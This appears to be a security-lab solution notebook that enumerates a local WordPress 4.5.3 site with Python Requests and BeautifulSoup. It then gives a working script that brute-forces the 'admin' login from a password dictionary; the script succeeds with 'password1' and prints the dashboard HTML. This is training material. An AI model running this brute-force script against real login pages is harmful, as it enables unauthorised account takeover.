
# Attacking Web Portals Solution

A popular **CMS** is hosted on **port 80** of local machine. Perform the give tasks to complete the challenge. 

**Requests** and **BeautifulSoup** libraries are installed on the machine. A password dictionary "password_dictionary.txt" is present in the working directory. 

## Learn

**Task 1:** Check if web portal is up by using GET request.


```python
import requests

resp = requests.get('http://localhost')

print(resp)
```

    <Response [200]>


**Task 2:** Which server software is being used?


```python
import requests

resp = requests.get('http://localhost')

print(resp.headers.get('server'))
```

    nginx/1.14.0


**Task 3:** Print response headers of the GET response.


```python
import requests

resp = requests.get('http://localhost')

print(resp.headers)
```

    {'Server': 'nginx/1.14.0', 'Date': 'Fri, 21 Sep 2018 07:30:37 GMT', 'Content-Type': 'text/html; charset=UTF-8', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Link': '</wp-json/>; rel="https://api.w.org/"', 'Content-Encoding': 'gzip'}


**Task 4:** Get text content of localhost homepage. Also, can you tell which CMS is running on localhost?


```python
import requests

resp = requests.get('http://localhost')

print(resp.text)

```

    <!DOCTYPE html>
    <html lang="en-US" class="no-js">
    <head>
    	<meta charset="UTF-8">
    	<meta name="viewport" content="width=device-width, initial-scale=1">
    	<link rel="profile" href="http://gmpg.org/xfn/11">
    		<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
    <title>Target WordPress &#8211; Just another WordPress site</title>
    <link rel="alternate" type="application/rss+xml" title="Target WordPress &raquo; Feed" href="/feed/" />
    <link rel="alternate" type="application/rss+xml" title="Target WordPress &raquo; Comments Feed" href="/comments/feed/" />
    		<script type="text/javascript">
    			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.5.3"}};
    			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;if(!g||!g.fillText)return!1;switch(g.textBaseline="top",g.font="600 32px Arial",a){case"flag":return g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3;case"diversity":return g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,d=c[0]+","+c[1]+","+c[2]+","+c[3],g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e;case"simple":return g.fillText(h(55357,56835),0,0),0!==g.getImageData(16,16,1,1).data[0];case"unicode8":return g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
    		</script>
    		<style type="text/css">
    img.wp-smiley,
    img.emoji {
    	display: inline !important;
    	border: none !important;
    	box-shadow: none !important;
    	height: 1em !important;
    	width: 1em !important;
    	margin: 0 .07em !important;
    	vertical-align: -0.1em !important;
    	background: none !important;
    	padding: 0 !important;
    }
    </style>
    <link rel='stylesheet' id='twentysixteen-fonts-css'  href='https://fonts.googleapis.com/css?family=Merriweather%3A400%2C700%2C900%2C400italic%2C700italic%2C900italic%7CMontserrat%3A400%2C700%7CInconsolata%3A400&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
    <link rel='stylesheet' id='genericons-css'  href='/wp-content/themes/twentysixteen/genericons/genericons.css?ver=3.4.1' type='text/css' media='all' />
    <link rel='stylesheet' id='twentysixteen-style-css'  href='/wp-content/themes/twentysixteen/style.css?ver=4.5.3' type='text/css' media='all' />
    <!--[if lt IE 10]>
    <link rel='stylesheet' id='twentysixteen-ie-css'  href='/wp-content/themes/twentysixteen/css/ie.css?ver=20160412' type='text/css' media='all' />
    <![endif]-->
    <!--[if lt IE 9]>
    <link rel='stylesheet' id='twentysixteen-ie8-css'  href='/wp-content/themes/twentysixteen/css/ie8.css?ver=20160412' type='text/css' media='all' />
    <![endif]-->
    <!--[if lt IE 8]>
    <link rel='stylesheet' id='twentysixteen-ie7-css'  href='/wp-content/themes/twentysixteen/css/ie7.css?ver=20160412' type='text/css' media='all' />
    <![endif]-->
    <!--[if lt IE 9]>
    <script type='text/javascript' src='/wp-content/themes/twentysixteen/js/html5.js?ver=3.7.3'></script>
    <![endif]-->
    <script type='text/javascript' src='http://localhost/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
    <script type='text/javascript' src='http://localhost/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
    <link rel='https://api.w.org/' href='/wp-json/' />
    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd" />
    <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/wp-includes/wlwmanifest.xml" /> 
    <meta name="generator" content="WordPress 4.5.3" />
    		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
    		</head>
    
    <body class="home blog hfeed">
    <div id="page" class="site">
    	<div class="site-inner">
    		<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
    
    		<header id="masthead" class="site-header" role="banner">
    			<div class="site-header-main">
    				<div class="site-branding">
    					
    											<h1 class="site-title"><a href="/" rel="home">Target WordPress</a></h1>
    											<p class="site-description">Just another WordPress site</p>
    									</div><!-- .site-branding -->
    
    							</div><!-- .site-header-main -->
    
    					</header><!-- .site-header -->
    
    		<div id="content" class="site-content">
    
    	<div id="primary" class="content-area">
    		<main id="main" class="site-main" role="main">
    
    		
    			
    			
    <article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
    	<header class="entry-header">
    		
    		<h2 class="entry-title"><a href="/2018/07/12/hello-world/" rel="bookmark">Hello world!</a></h2>	</header><!-- .entry-header -->
    
    	
    	
    	<div class="entry-content">
    		<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!</p>
    	</div><!-- .entry-content -->
    
    	<footer class="entry-footer">
    		<span class="byline"><span class="author vcard"><img alt='' src='http://1.gravatar.com/avatar/1e421ab419b5bee07fe7fba2adc4e22f?s=49&#038;d=mm&#038;r=g' srcset='http://1.gravatar.com/avatar/1e421ab419b5bee07fe7fba2adc4e22f?s=98&amp;d=mm&amp;r=g 2x' class='avatar avatar-49 photo' height='49' width='49' /><span class="screen-reader-text">Author </span> <a class="url fn n" href="/author/admin/">admin</a></span></span><span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="/2018/07/12/hello-world/" rel="bookmark"><time class="entry-date published updated" datetime="2018-07-12T19:19:22+00:00">July 12, 2018</time></a></span><span class="comments-link"><a href="/2018/07/12/hello-world/#comments">1 Comment<span class="screen-reader-text"> on Hello world!</span></a></span>			</footer><!-- .entry-footer -->
    </article><!-- #post-## -->
    
    		</main><!-- .site-main -->
    	</div><!-- .content-area -->
    
    
    	<aside id="secondary" class="sidebar widget-area" role="complementary">
    		<section id="search-2" class="widget widget_search">
    <form role="search" method="get" class="search-form" action="/">
    	<label>
    		<span class="screen-reader-text">Search for:</span>
    		<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
    	</label>
    	<button type="submit" class="search-submit"><span class="screen-reader-text">Search</span></button>
    </form>
    </section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
    					<li>
    				<a href="/2018/07/12/hello-world/">Hello world!</a>
    						</li>
    				</ul>
    		</section>		<section id="recent-comments-2" class="widget widget_recent_comments"><h2 class="widget-title">Recent Comments</h2><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href='https://wordpress.org/' rel='external nofollow' class='url'>Mr WordPress</a></span> on <a href="/2018/07/12/hello-world/#comment-1">Hello world!</a></li></ul></section><section id="archives-2" class="widget widget_archive"><h2 class="widget-title">Archives</h2>		<ul>
    			<li><a href='/2018/07/'>July 2018</a></li>
    		</ul>
    		</section><section id="categories-2" class="widget widget_categories"><h2 class="widget-title">Categories</h2>		<ul>
    	<li class="cat-item cat-item-1"><a href="/category/uncategorized/" >Uncategorized</a>
    </li>
    		</ul>
    </section><section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Meta</h2>			<ul>
    						<li><a href="/wp-login.php">Log in</a></li>
    			<li><a href="/feed/">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
    			<li><a href="/comments/feed/">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
    			<li><a href="https://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>			</ul>
    			</section>	</aside><!-- .sidebar .widget-area -->
    
    		</div><!-- .site-content -->
    
    		<footer id="colophon" class="site-footer" role="contentinfo">
    			
    			
    			<div class="site-info">
    								<span class="site-title"><a href="/" rel="home">Target WordPress</a></span>
    				<a href="https://wordpress.org/">Proudly powered by WordPress</a>
    			</div><!-- .site-info -->
    		</footer><!-- .site-footer -->
    	</div><!-- .site-inner -->
    </div><!-- .site -->
    
    <script type='text/javascript' src='/wp-content/themes/twentysixteen/js/skip-link-focus-fix.js?ver=20160412'></script>
    <script type='text/javascript'>
    /* <![CDATA[ */
    var screenReaderText = {"expand":"expand child menu","collapse":"collapse child menu"};
    /* ]]> */
    </script>
    <script type='text/javascript' src='/wp-content/themes/twentysixteen/js/functions.js?ver=20160412'></script>
    <script type='text/javascript' src='http://localhost/wp-includes/js/wp-embed.min.js?ver=4.5.3'></script>
    </body>
    </html>
    


**Answer:** WordPress 

**Task 5:** Print the response in a pretty form using Beautiful Soup.


```python
import requests
from bs4 import BeautifulSoup

resp = requests.get('http://localhost')
soup = BeautifulSoup(resp.text, 'html.parser')

print(soup.prettify())
```

    <!DOCTYPE html>
    <html class="no-js" lang="en-US">
     <head>
      <meta charset="utf-8"/>
      <meta content="width=device-width, initial-scale=1" name="viewport"/>
      <link href="http://gmpg.org/xfn/11" rel="profile"/>
      <script>
       (function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);
      </script>
      <title>
       Target WordPress – Just another WordPress site
      </title>
      <link href="/feed/" rel="alternate" title="Target WordPress » Feed" type="application/rss+xml">
       <link href="/comments/feed/" rel="alternate" title="Target WordPress » Comments Feed" type="application/rss+xml"/>
       <script type="text/javascript">
        window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.5.3"}};
    			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;if(!g||!g.fillText)return!1;switch(g.textBaseline="top",g.font="600 32px Arial",a){case"flag":return g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3;case"diversity":return g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,d=c[0]+","+c[1]+","+c[2]+","+c[3],g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e;case"simple":return g.fillText(h(55357,56835),0,0),0!==g.getImageData(16,16,1,1).data[0];case"unicode8":return g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
       </script>
       <style type="text/css">
        img.wp-smiley,
    img.emoji {
    	display: inline !important;
    	border: none !important;
    	box-shadow: none !important;
    	height: 1em !important;
    	width: 1em !important;
    	margin: 0 .07em !important;
    	vertical-align: -0.1em !important;
    	background: none !important;
    	padding: 0 !important;
    }
       </style>
       <link href="https://fonts.googleapis.com/css?family=Merriweather%3A400%2C700%2C900%2C400italic%2C700italic%2C900italic%7CMontserrat%3A400%2C700%7CInconsolata%3A400&amp;subset=latin%2Clatin-ext" id="twentysixteen-fonts-css" media="all" rel="stylesheet" type="text/css"/>
       <link href="/wp-content/themes/twentysixteen/genericons/genericons.css?ver=3.4.1" id="genericons-css" media="all" rel="stylesheet" type="text/css"/>
       <link href="/wp-content/themes/twentysixteen/style.css?ver=4.5.3" id="twentysixteen-style-css" media="all" rel="stylesheet" type="text/css"/>
       <!--[if lt IE 10]>
    <link rel='stylesheet' id='twentysixteen-ie-css'  href='/wp-content/themes/twentysixteen/css/ie.css?ver=20160412' type='text/css' media='all' />
    <![endif]-->
       <!--[if lt IE 9]>
    <link rel='stylesheet' id='twentysixteen-ie8-css'  href='/wp-content/themes/twentysixteen/css/ie8.css?ver=20160412' type='text/css' media='all' />
    <![endif]-->
       <!--[if lt IE 8]>
    <link rel='stylesheet' id='twentysixteen-ie7-css'  href='/wp-content/themes/twentysixteen/css/ie7.css?ver=20160412' type='text/css' media='all' />
    <![endif]-->
       <!--[if lt IE 9]>
    <script type='text/javascript' src='/wp-content/themes/twentysixteen/js/html5.js?ver=3.7.3'></script>
    <![endif]-->
       <script src="http://localhost/wp-includes/js/jquery/jquery.js?ver=1.12.4" type="text/javascript">
       </script>
       <script src="http://localhost/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1" type="text/javascript">
       </script>
       <link href="/wp-json/" rel="https://api.w.org/"/>
       <link href="/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
       <link href="/wp-includes/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
       <meta content="WordPress 4.5.3" name="generator">
        <style type="text/css">
         .recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}
        </style>
       </meta>
      </link>
     </head>
     <body class="home blog hfeed">
      <div class="site" id="page">
       <div class="site-inner">
        <a class="skip-link screen-reader-text" href="#content">
         Skip to content
        </a>
        <header class="site-header" id="masthead" role="banner">
         <div class="site-header-main">
          <div class="site-branding">
           <h1 class="site-title">
            <a href="/" rel="home">
             Target WordPress
            </a>
           </h1>
           <p class="site-description">
            Just another WordPress site
           </p>
          </div>
          <!-- .site-branding -->
         </div>
         <!-- .site-header-main -->
        </header>
        <!-- .site-header -->
        <div class="site-content" id="content">
         <div class="content-area" id="primary">
          <main class="site-main" id="main" role="main">
           <article class="post-1 post type-post status-publish format-standard hentry category-uncategorized" id="post-1">
            <header class="entry-header">
             <h2 class="entry-title">
              <a href="/2018/07/12/hello-world/" rel="bookmark">
               Hello world!
              </a>
             </h2>
            </header>
            <!-- .entry-header -->
            <div class="entry-content">
             <p>
              Welcome to WordPress. This is your first post. Edit or delete it, then start writing!
             </p>
            </div>
            <!-- .entry-content -->
            <footer class="entry-footer">
             <span class="byline">
              <span class="author vcard">
               <img alt="" class="avatar avatar-49 photo" height="49" src="http://1.gravatar.com/avatar/1e421ab419b5bee07fe7fba2adc4e22f?s=49&amp;d=mm&amp;r=g" srcset="http://1.gravatar.com/avatar/1e421ab419b5bee07fe7fba2adc4e22f?s=98&amp;d=mm&amp;r=g 2x" width="49"/>
               <span class="screen-reader-text">
                Author
               </span>
               <a class="url fn n" href="/author/admin/">
                admin
               </a>
              </span>
             </span>
             <span class="posted-on">
              <span class="screen-reader-text">
               Posted on
              </span>
              <a href="/2018/07/12/hello-world/" rel="bookmark">
               <time class="entry-date published updated" datetime="2018-07-12T19:19:22+00:00">
                July 12, 2018
               </time>
              </a>
             </span>
             <span class="comments-link">
              <a href="/2018/07/12/hello-world/#comments">
               1 Comment
               <span class="screen-reader-text">
                on Hello world!
               </span>
              </a>
             </span>
            </footer>
            <!-- .entry-footer -->
           </article>
           <!-- #post-## -->
          </main>
          <!-- .site-main -->
         </div>
         <!-- .content-area -->
         <aside class="sidebar widget-area" id="secondary" role="complementary">
          <section class="widget widget_search" id="search-2">
           <form action="/" class="search-form" method="get" role="search">
            <label>
             <span class="screen-reader-text">
              Search for:
             </span>
             <input class="search-field" name="s" placeholder="Search …" type="search" value=""/>
            </label>
            <button class="search-submit" type="submit">
             <span class="screen-reader-text">
              Search
             </span>
            </button>
           </form>
          </section>
          <section class="widget widget_recent_entries" id="recent-posts-2">
           <h2 class="widget-title">
            Recent Posts
           </h2>
           <ul>
            <li>
             <a href="/2018/07/12/hello-world/">
              Hello world!
             </a>
            </li>
           </ul>
          </section>
          <section class="widget widget_recent_comments" id="recent-comments-2">
           <h2 class="widget-title">
            Recent Comments
           </h2>
           <ul id="recentcomments">
            <li class="recentcomments">
             <span class="comment-author-link">
              <a class="url" href="https://wordpress.org/" rel="external nofollow">
               Mr WordPress
              </a>
             </span>
             on
             <a href="/2018/07/12/hello-world/#comment-1">
              Hello world!
             </a>
            </li>
           </ul>
          </section>
          <section class="widget widget_archive" id="archives-2">
           <h2 class="widget-title">
            Archives
           </h2>
           <ul>
            <li>
             <a href="/2018/07/">
              July 2018
             </a>
            </li>
           </ul>
          </section>
          <section class="widget widget_categories" id="categories-2">
           <h2 class="widget-title">
            Categories
           </h2>
           <ul>
            <li class="cat-item cat-item-1">
             <a href="/category/uncategorized/">
              Uncategorized
             </a>
            </li>
           </ul>
          </section>
          <section class="widget widget_meta" id="meta-2">
           <h2 class="widget-title">
            Meta
           </h2>
           <ul>
            <li>
             <a href="/wp-login.php">
              Log in
             </a>
            </li>
            <li>
             <a href="/feed/">
              Entries
              <abbr title="Really Simple Syndication">
               RSS
              </abbr>
             </a>
            </li>
            <li>
             <a href="/comments/feed/">
              Comments
              <abbr title="Really Simple Syndication">
               RSS
              </abbr>
             </a>
            </li>
            <li>
             <a href="https://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">
              WordPress.org
             </a>
            </li>
           </ul>
          </section>
         </aside>
         <!-- .sidebar .widget-area -->
        </div>
        <!-- .site-content -->
        <footer class="site-footer" id="colophon" role="contentinfo">
         <div class="site-info">
          <span class="site-title">
           <a href="/" rel="home">
            Target WordPress
           </a>
          </span>
          <a href="https://wordpress.org/">
           Proudly powered by WordPress
          </a>
         </div>
         <!-- .site-info -->
        </footer>
        <!-- .site-footer -->
       </div>
       <!-- .site-inner -->
      </div>
      <!-- .site -->
      <script src="/wp-content/themes/twentysixteen/js/skip-link-focus-fix.js?ver=20160412" type="text/javascript">
      </script>
      <script type="text/javascript">
       /* <![CDATA[ */
    var screenReaderText = {"expand":"expand child menu","collapse":"collapse child menu"};
    /* ]]> */
      </script>
      <script src="/wp-content/themes/twentysixteen/js/functions.js?ver=20160412" type="text/javascript">
      </script>
      <script src="http://localhost/wp-includes/js/wp-embed.min.js?ver=4.5.3" type="text/javascript">
      </script>
     </body>
    </html>
    


**Task 6:** Print the title of web portal hosted on localhost?


```python
print(soup.title.string)
```

    Target WordPress – Just another WordPress site


**Task 7:** Print the URLs for images present on the homepage.


```python
img_tags = soup.find_all('img')

urls = [img['src'] for img in img_tags]

print(urls)
```

    ['http://1.gravatar.com/avatar/1e421ab419b5bee07fe7fba2adc4e22f?s=49&d=mm&r=g']


**Task 8:** Scrape all URLs from the home page of localhost and print unique URLs.


```python
import requests
from bs4 import BeautifulSoup

resp = requests.get("http://localhost")

soup=BeautifulSoup(resp.content,"html.parser")

anchor_list=[a['href'] for a in soup.find_all('a', href=True) if a.text.strip()]

anchor_set = set(anchor_list)

for link in anchor_set:
    print(link)
```

    /
    /author/admin/
    /2018/07/12/hello-world/#comments
    /feed/
    #content
    /category/uncategorized/
    /2018/07/12/hello-world/#comment-1
    /comments/feed/
    /2018/07/
    /wp-login.php
    /2018/07/12/hello-world/
    https://wordpress.org/


**Task 9:** Can you access the admin section (/wp-admin/) of the CMS?


```python
import requests
from bs4 import BeautifulSoup

resp = requests.get('http://localhost/wp-admin/')
soup = BeautifulSoup(resp.text, 'html.parser')

print(soup.prettify())

```

    <!DOCTYPE html>
    <link href="/wp-admin/load-styles.php?c=0&amp;dir=ltr&amp;load%5B%5D=dashicons,buttons,forms,l10n,login&amp;ver=4.8" media="all" rel="stylesheet" type="text/css"/>
    <!--[if IE 8]>
    		<html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
    	<![endif]-->
    <!--[if !(IE 8) ]><!-->
    <html lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
     <!--<![endif]-->
     <head>
      <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
      <title>
       Target WordPress ‹ Log In
      </title>
      <link href="http://localhost?redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F&amp;reauth=1/wp-admin/load-styles.php?c=0&amp;dir=ltr&amp;load%5B%5D=dashicons,buttons,forms,l10n,login&amp;ver=4.5.3" media="all" rel="stylesheet" type="text/css"/>
      <link href="https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&amp;subset=latin%2Clatin-ext&amp;ver=4.5.3" id="open-sans-css" media="all" rel="stylesheet" type="text/css"/>
      <meta content="noindex,follow" name="robots"/>
     </head>
     <body class="login login-action-login wp-core-ui locale-en-us">
      <div id="login">
       <h1>
        <a href="https://wordpress.org/" tabindex="-1" title="Powered by WordPress">
         Target WordPress
        </a>
       </h1>
       <form action="/wp-login.php" id="loginform" method="post" name="loginform">
        <p>
         <label for="user_login">
          Username or Email
          <br/>
          <input class="input" id="user_login" name="log" size="20" type="text" value=""/>
         </label>
        </p>
        <p>
         <label for="user_pass">
          Password
          <br/>
          <input class="input" id="user_pass" name="pwd" size="20" type="password" value=""/>
         </label>
        </p>
        <p class="forgetmenot">
         <label for="rememberme">
          <input id="rememberme" name="rememberme" type="checkbox" value="forever"/>
          Remember Me
         </label>
        </p>
        <p class="submit">
         <input class="button button-primary button-large" id="wp-submit" name="wp-submit" type="submit" value="Log In"/>
         <input name="redirect_to" type="hidden" value="http://localhost/wp-admin/"/>
         <input name="testcookie" type="hidden" value="1"/>
        </p>
       </form>
       <p id="nav">
        <a href="/wp-login.php?action=lostpassword">
         Lost your password?
        </a>
       </p>
       <script type="text/javascript">
        function wp_attempt_focus(){
    setTimeout( function(){ try{
    d = document.getElementById('user_login');
    d.focus();
    d.select();
    } catch(e){}
    }, 200);
    }
    
    wp_attempt_focus();
    if(typeof wpOnload=='function')wpOnload();
       </script>
       <p id="backtoblog">
        <a href="/">
         ← Back to Target WordPress
        </a>
       </p>
      </div>
      <div class="clear">
      </div>
     </body>
    </html>
    


**Answer:** No. If you look closely at the response content, you will observe the login page. So, you have to get correct username and password to access admin area.

## Attack

**Task 10:** Bruteforce the wordpress login for user "admin". Use the given dictionary.


```python
import requests

password_dict="password_dictionary.txt"

# Loading the password dictionary and Striping \n
lines = [line.rstrip('\n') for line in open(password_dict)]

for password in lines:
    print("Trying with password: ",password)
    resp = requests.post('http://localhost/wp-login.php', data = {'log':'admin', 'pwd': password })
    if "ERROR" not in resp.text:
        print("Login successful with password: ",password)
        break

print(resp.text)
```

    Trying with password:  123456
    Trying with password:  12345
    Trying with password:  1234
    Trying with password:  1234567
    Trying with password:  dragon
    Trying with password:  baseball
    Trying with password:  abc123
    Trying with password:  letmein
    Trying with password:  696969
    Trying with password:  shadow
    Trying with password:  michael
    Trying with password:  654321
    Trying with password:  password
    Trying with password:  superman
    Trying with password:  password1
    Login successful with password:  password1
    <!DOCTYPE html>
    <!--[if IE 8]>
    <html xmlns="http://www.w3.org/1999/xhtml" class="ie8 wp-toolbar"  lang="en-US">
    <![endif]-->
    <!--[if !(IE 8) ]><!-->
    <html xmlns="http://www.w3.org/1999/xhtml" class="wp-toolbar"  lang="en-US">
    <!--<![endif]-->
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Dashboard &lsaquo; Target WordPress &#8212; WordPress</title>
    <script type="text/javascript">
    addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};
    var ajaxurl = '/wp-admin/admin-ajax.php',
    	pagenow = 'dashboard',
    	typenow = '',
    	adminpage = 'index-php',
    	thousandsSeparator = ',',
    	decimalPoint = '.',
    	isRtl = 0;
    </script>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <style type="text/css">
    img.wp-smiley,
    img.emoji {
    	display: inline !important;
    	border: none !important;
    	box-shadow: none !important;
    	height: 1em !important;
    	width: 1em !important;
    	margin: 0 .07em !important;
    	vertical-align: -0.1em !important;
    	background: none !important;
    	padding: 0 !important;
    }
    </style>
    <link rel='stylesheet' href='http://localhost/wp-admin/load-styles.php?c=0&amp;dir=ltr&amp;load%5B%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,&amp;load%5B%5D=l10n,buttons,wp-auth-check&amp;ver=4.5.3' type='text/css' media='all' />
    <link rel='stylesheet' id='open-sans-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.5.3' type='text/css' media='all' />
    <link rel='stylesheet' id='thickbox-css'  href='http://localhost/wp-includes/js/thickbox/thickbox.css?ver=4.5.3' type='text/css' media='all' />
    <!--[if lte IE 7]>
    <link rel='stylesheet' id='ie-css'  href='http://localhost/wp-admin/css/ie.min.css?ver=4.5.3' type='text/css' media='all' />
    <![endif]-->
    		<script type="text/javascript">
    			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.5.3"}};
    			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;if(!g||!g.fillText)return!1;switch(g.textBaseline="top",g.font="600 32px Arial",a){case"flag":return g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3;case"diversity":return g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,d=c[0]+","+c[1]+","+c[2]+","+c[3],g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e;case"simple":return g.fillText(h(55357,56835),0,0),0!==g.getImageData(16,16,1,1).data[0];case"unicode8":return g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
    		</script>
    		
    <script type='text/javascript'>
    /* <![CDATA[ */
    var userSettings = {"url":"\/","uid":"1","time":"1537517481","secure":""};/* ]]> */
    </script>
    <script type='text/javascript' src='http://localhost/wp-admin/load-scripts.php?c=0&amp;load%5B%5D=jquery-core,jquery-migrate,utils&amp;ver=4.5.3'></script>
    <!--[if lt IE 8]>
    <script type='text/javascript' src='http://localhost/wp-includes/js/json2.min.js?ver=2015-05-03'></script>
    <![endif]-->
    	<link id="wp-admin-canonical" rel="canonical" href="http://localhost/wp-admin/" />
    	<script>
    		if ( window.history.replaceState ) {
    			window.history.replaceState( null, null, document.getElementById( 'wp-admin-canonical' ).href + window.location.hash );
    		}
    	</script>
    <script type="text/javascript">var _wpColorScheme = {"icons":{"base":"#82878c","focus":"#00a0d2","current":"#fff"}};</script>
